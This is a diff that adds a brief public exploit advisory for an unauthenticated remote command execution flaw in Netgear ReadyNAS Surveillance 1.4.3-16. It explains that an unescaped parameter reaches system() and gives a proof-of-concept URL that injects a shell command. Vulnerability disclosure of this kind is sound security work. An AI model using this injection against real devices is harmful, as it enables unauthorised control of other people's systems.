@@ -1,0 +1,17 @@
+# Exploit Netgear ReadyNAS Surveillance 1.4.3-16 Unauthenticated RCE
+# Date: 27.09.2017
+# Software Link: https://www.netgear.com/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: remote
+   
+1. Description
+  
+$_GET['uploaddir'] is not escaped and passed to system() through $tmp_upload_dir.
+
+https://security.szurek.pl/netgear-ready-nas-surveillance-14316-unauthenticated-rce.html
+ 
+2. Proof of Concept
+
+http://IP/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;sleep%205;%27
